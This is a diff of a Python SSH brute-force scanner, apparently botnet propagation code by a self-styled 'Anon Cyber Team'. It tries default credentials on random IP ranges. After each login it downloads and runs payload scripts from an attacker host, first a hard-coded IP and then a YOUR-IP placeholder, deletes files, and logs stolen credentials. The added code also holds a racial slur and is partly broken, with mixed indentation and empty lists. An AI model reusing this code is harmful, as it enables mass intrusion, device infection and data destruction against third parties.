@@ -1,30 +1,85 @@
 #!/usr/bin/env python
+#**********************************
+# Bruteforcing Vulnerable Devices #
+#    By 4WSec - Anon Cyber Team   #
+#*********************************
+
+###############################
+class color:
+   PURPLE = '\033[95m'
+   CYAN = '\033[96m'
+   DARKCYAN = '\033[36m'
+   BLUE = '\033[94m'
+   GREEN = '\033[92m'
+   YELLOW = '\033[93m'
+   RED = '\033[91m'
+   BOLD = '\033[1m'
+   UNDERLINE = '\033[4m'
+   END = '\033[0m'
+   HEADER = '\033[95m'
+   OKBLUE = '\033[94m'
+   OKGREEN = '\033[92m'
+   WARNING = '\033[93m'
+   FAIL = '\033[91m'
+W  = '\033[0m'  # white (normal)
+R  = '\033[31m' # red
+G  = '\033[32m' # green
+O  = '\033[33m' # orange
+B  = '\033[34m' # blue
+P  = '\033[35m' # purple
+C  = '\033[36m' # cyan
+GR = '\033[37m' # gray
+T  = '\033[93m' # tan
+M = '\033[1;35;32m' # magenta
+###############################
+
+
+# RANGES , 119.93, 122.3, 122.52, 101.109, 180.180, 125.27, 101.109
 import threading, paramiko, random, socket, time, sys
 
+print ''
+print color.RED + '[ Please, Input Ur IP Into Line 177 !!! ]'
+print color.END + '------------------------------------------------------------------------------------------------'
+usage='Usage: python gaza.py [threads] [A|B|C|LUCKY|LUCKY2|FAST] [IPRANGE] [admin|vps|rooty|silent|saw|perl]'
+if len(sys.argv) < 4:
+        sys.exit(usage)
+
+paramiko.util.log_to_file("/dev/null")
 
 blacklist = [
-    '127'
+    '127','192.168'
 ]
 
 passwords = [ 
-    "root:root",
-    "root:admin",
-    "admin:admin",
-    "ubnt:ubnt"
-    "root:1234",
-    "admin:1234",
-    "guest:guest",
-    "user:user",
-    "test:test",
-    "pi:raspberry",
-    "vagrant:vagrant"
+  "telnet:telnet"
+  "admin:admin",
+  "root:root",
+  "ubuntu:ubntu",
+  "vagrant:vagrant",
+  "admin123:admin123",
+  "root123:root123",
+  "vps1:vps1",
 ]
 
-if sys.argv[4] == '1':
-    passwords = ["root:root", "root:admin", "admin:1234"]
+if sys.argv[4] == 'admin':
+     passwords = ["root:root"]
+if sys.argv[4] == 'vps':
+     passwords = ["guest:guest"]
+if sys.argv[4] == 'rooty':
+     passwords = ["admin:admin"]
+if sys.argv[4] == 'silent':
+     passwords = ["telnet:telnet"]
+if sys.argv[4] == 'saw':
+	passwords = ["root:root", "admin:1234", "admin:admin", "lucky:lucky", "vps1:vps1"]
+if sys.argv[4] == 'perl':
+	passwords = ["root:admin"]
 
-jackmeoff = random.choice(["see nudes of rootgod"])
-raw_input('Press <ENTER> To '+jackmeoff)
+print color.DARKCYAN + "  ______ _______ ______ _______ "
+print color.WARNING + " |  ____ |_____|  ____/ |_____| "
+print color.DARKCYAN + " |_____| |     | /_____ |     | "
+print ""
+print color.OKGREEN + "--==[ Scanner SSH, Telnet by 4WSec "
+print color.OKGREEN + "--==[ Anon Cyber Team "
 
 ipclassinfo = sys.argv[2]
 if ipclassinfo == "A":
@@ -66,25 +121,19 @@ class sshscanner(threading.Thread):
                         self.host = ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                     elif ipclassinfo == "C":
                         self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
-                    elif ipclassinfo == "BRAZIL":
-                        br = ["179.105","179.152","189.29","189.32","189.33","189.34","189.35","189.39","189.4","189.54","189.55","189.60","189.61","189.62","189.63","189.126"]
-                        self.host = random.choice(br)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
-                    elif ipclassinfo == "SUPER":
-                        yeet = ["122","131","161","37","186","187","31","188","201","2","200"]
-                        self.host = random.choice(yeet)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                     elif ipclassinfo == "LUCKY":
-                        lucky = ["125.24","125.25","125.26","125.27","125.28","113.53","101.51","101.108","118.175","118.173","182.52","180.180"]
+                        lucky = ["91.99","91.98","5.74","113.53", "119.92", "223.179", "101.108", "125.24", "125.25", "125.26", "119.93"]
                         self.host = random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "ANAL":
+                        anal = ["125.27","101.109","113.53","118.173","122.170","122.180","46.62","5.78","101.108","1.20","125.25","125.26","182.52","118.172","118.174","118.175","125.24"]
+                        self.host = random.choice(anal)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                     elif ipclassinfo == "LUCKY2":
-                        lucky2 = [ "122.178","122.170","182.65","182.68","182.70","182.75","186.112","186.113","186.114","186.115","186.116","186.118" ]
-                        self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
-                    elif ipclassinfo == "RAND":
-                        self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
-                    elif ipclassinfo == "INTERNET":
-                        lol = ["1"]
-                        self.host = random.choice(lol)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
-                    else:
-                        self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                        lucky2 = lucky2 = [ ]
+			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+		    elif ipclassinfo == "FAST":
+                        lucky2 = [  ]
+			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+
                     for badip in blacklist:
                         if badip in self.host:
                             thisipisbad='yes'
@@ -94,7 +143,7 @@ class sshscanner(threading.Thread):
                 password=""
                 port = 22
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(3)
+                s.settimeout(1)
                 s.connect((self.host, port))
                 s.close()
                 ssh = paramiko.SSHClient()
@@ -123,14 +172,16 @@ class sshscanner(threading.Thread):
                 if "inet addr" in output:
                     badserver=False
                 if badserver == False:
-                        print 'Found '+self.host+'|'+username+'|'+password+'|'+str(port)
-                        ssh.exec_command(" cd /tmp; wget http://46.166.185.161/bins.sh || curl -O http://46.166.185.161/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 46.166.185.161 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 46.166.185.161; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh")
-                        time.sleep(20)
+                        print '\x1b[1;31mDevices Infected: ' +self.host+' username: '+username+' Pass: '+password+'|'+str(port)
+            # INPUT YOUR IP INTO LINE 194, change this: [ YOUR-IP]            
+			ssh.exec_command("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://YOUR-IP/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp YOUR-IP -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g YOUR-IP; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P YOUR-IP ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *")
+			nigger = open("anal.txt", "a").write(username + ":" + password + ":" + self.host + "\n")
+                        time.sleep(0.5)
                         ssh.close()
             except:
                 pass
 
-for x in range(0,int(sys.argv[1])):
+for x in range(0,1500):
     try:
         t = sshscanner()
         t.start()
